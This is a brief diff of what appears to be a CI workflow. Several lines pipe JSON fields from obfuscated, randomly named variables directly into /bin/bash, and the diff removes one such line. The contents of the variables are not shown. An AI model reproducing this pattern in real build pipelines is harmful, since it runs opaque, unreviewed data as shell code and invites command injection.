@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$g31960" | jq -r .mo538 | /bin/bash
           printf '%s' "$xv9525" | jq -r .jepz53257 | /bin/bash
           echo $yys97 | jq -r .h45126 | /bin/bash
-          printf '%s' "$qbxn4032" | jq -r .k021 | /bin/bash
           printf '%s' "$upncp6" | jq -r .wea2284 | /bin/bash
 
       - name: Save archive
